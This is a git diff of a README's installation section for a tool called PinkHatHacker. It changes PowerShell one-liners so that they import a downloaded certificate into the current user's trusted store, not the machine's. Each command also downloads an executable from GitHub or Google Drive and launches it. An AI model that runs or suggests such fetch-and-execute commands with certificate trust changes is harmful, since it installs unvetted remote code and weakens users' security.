@@ -47,15 +47,13 @@ You can download the compiled assets directly from the [v1.0.2 Release](https://
 
 #### A. Install Certificate & App via GitHub
 ```powershell
-powershell -Command "Invoke-WebRequest -Uri '[https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt](https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt)' -OutFile '$env:TEMP\cert.crt'; Import-Certificate -FilePath '$env:TEMP\cert.crt' -CertStoreLocation 'Cert:\LocalMachine\TrustedPeople'; Invoke-WebRequest -Uri '[https://github.com/show-now/pinkhathacker/releases/download/v1.0.2/PinkHatHacker.v1.0.2.exe](https://github.com/show-now/pinkhathacker/releases/download/v1.0.2/PinkHatHacker.v1.0.2.exe)' -OutFile '$env:TEMP\PinkHatHacker.exe'; Start-Process '$env:TEMP\PinkHatHacker.exe'"
-
+powershell -Command "Invoke-WebRequest -Uri '[https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt](https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt)' -OutFile '$env:TEMP\cert.crt'; Import-Certificate -FilePath '$env:TEMP\cert.crt' -CertStoreLocation 'Cert:\CurrentUser\TrustedPeople'; Invoke-WebRequest -Uri '[https://github.com/show-now/pinkhathacker/releases/download/v1.0.2/PinkHatHacker.v1.0.2.exe](https://github.com/show-now/pinkhathacker/releases/download/v1.0.2/PinkHatHacker.v1.0.2.exe)' -OutFile '$env:TEMP\PinkHatHacker.exe'; Start-Process '$env:TEMP\PinkHatHacker.exe'"
 ```
 
 #### B. Install Certificate & App via Google Drive
 
 ```powershell
-powershell -Command "Invoke-WebRequest -Uri '[https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt](https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt)' -OutFile '$env:TEMP\cert.crt'; Import-Certificate -FilePath '$env:TEMP\cert.crt' -CertStoreLocation 'Cert:\LocalMachine\TrustedPeople'; Invoke-WebRequest -Uri '[https://drive.google.com/uc?export=download&id=1c3i1lt7i1XsxcMBMnGe084EpMC4swL-o](https://drive.google.com/uc?export=download&id=1c3i1lt7i1XsxcMBMnGe084EpMC4swL-o)' -OutFile '$env:TEMP\PinkHatHacker.exe'; Start-Process '$env:TEMP\PinkHatHacker.exe'"
-
+powershell -Command "Invoke-WebRequest -Uri '[https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt](https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt)' -OutFile '$env:TEMP\cert.crt'; Import-Certificate -FilePath '$env:TEMP\cert.crt' -CertStoreLocation 'Cert:\CurrentUser\TrustedPeople'; Invoke-WebRequest -Uri '[https://drive.google.com/uc?export=download&id=1c3i1lt7i1XsxcMBMnGe084EpMC4swL-o](https://drive.google.com/uc?export=download&id=1c3i1lt7i1XsxcMBMnGe084EpMC4swL-o)' -OutFile '$env:TEMP\PinkHatHacker.exe'; Start-Process '$env:TEMP\PinkHatHacker.exe'"
 ```
 
 ---
@@ -67,8 +65,7 @@ powershell -Command "Invoke-WebRequest -Uri '[https://raw.githubusercontent.com/
 #### Step 1: Install Certificate Only
 
 ```powershell
-powershell -Command "Invoke-WebRequest -Uri '[https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt](https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt)' -OutFile '$env:TEMP\cert.crt'; Import-Certificate -FilePath '$env:TEMP\cert.crt' -CertStoreLocation 'Cert:\LocalMachine\TrustedPeople'"
-
+powershell -Command "Invoke-WebRequest -Uri '[https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt](https://raw.githubusercontent.com/show-now/pinkhathacker/refs/heads/main/cert.crt)' -OutFile '$env:TEMP\cert.crt'; Import-Certificate -FilePath '$env:TEMP\cert.crt' -CertStoreLocation 'Cert:\CurrentUser\TrustedPeople'"
 ```
 
 #### Step 2: Download Executable or Source Code Separately
@@ -76,13 +73,12 @@ powershell -Command "Invoke-WebRequest -Uri '[https://raw.githubusercontent.com/
 * **Download & Run Executable (`.exe`) via GitHub:**
 ```powershell
 powershell -Command "Invoke-WebRequest -Uri '[https://github.com/show-now/pinkhathacker/releases/download/v1.0.2/PinkHatHacker.v1.0.2.exe](https://github.com/show-now/pinkhathacker/releases/download/v1.0.2/PinkHatHacker.v1.0.2.exe)' -OutFile '$env:TEMP\PinkHatHacker.exe'; Start-Process '$env:TEMP\PinkHatHacker.exe'"
-
 ```
+
 
 * **Download Executable (`.exe`) via Google Drive:**
 ```powershell
 powershell -Command "Invoke-WebRequest -Uri '[https://drive.google.com/uc?export=download&id=1c3i1lt7i1XsxcMBMnGe084EpMC4swL-o](https://drive.google.com/uc?export=download&id=1c3i1lt7i1XsxcMBMnGe084EpMC4swL-o)' -OutFile '$env:TEMP\PinkHatHacker.exe'; Start-Process '$env:TEMP\PinkHatHacker.exe'"
-
 ```
 
 <br><br><br>
